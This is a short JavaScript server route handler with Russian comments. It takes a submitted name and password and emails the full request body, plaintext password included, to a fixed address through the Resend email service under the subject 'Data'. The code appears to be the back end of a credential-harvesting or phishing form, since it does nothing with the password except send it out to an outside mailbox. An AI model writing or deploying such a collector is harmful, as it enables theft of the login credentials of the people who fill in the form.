import { Resend } from 'resend'

const resend = new Resend(process.env.RESEND_API_KEY)

export async function POST(req) {
  try {
    const data = await req.json()
    const { name, password } = data

    // Отправляем письмо на фиксированный email
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: process.env.TO_EMAIL,
      subject: 'Data',
      html: `
        ${JSON.stringify(data)}
      `,
    })

    return Response.json({ success: true, message: 'Письмо успешно отправлено' })
  } catch (error) {
    console.error('Ошибка при отправке:', error)
    return Response.json({ success: false, error: error.message }, { status: 500 })
  }
}
